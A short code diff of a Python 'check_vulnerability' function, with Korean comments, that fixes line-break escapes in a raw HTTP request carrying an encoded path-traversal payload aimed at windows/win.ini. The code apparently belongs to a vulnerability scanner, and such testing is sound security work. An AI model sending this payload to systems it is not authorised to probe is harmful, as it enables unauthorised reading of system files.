@@ -66,13 +66,9 @@ def check_vulnerability(target_ip, target_port):
 
         # 악성 패이턴: 경로 순회 시도
         # 공격자는 이러한 패턴을 통해 시스템 파일에 접근을 시도함
-        payload = "GET /..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows/win.ini HTTP/1.1\r
-"
-        payload += "Host: {}\r
-".format(target_ip)
-        payload += "User-Agent: Vulnerability-Scanner\r
-\r
-"
+        payload = "GET /..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows/win.ini HTTP/1.1\r\n"
+        payload += "Host: {}\r\n".format(target_ip)
+        payload += "User-Agent: Vulnerability-Scanner\r\n\r\n"
 
         s.send(payload.encode())
         response = s.recv(1024)
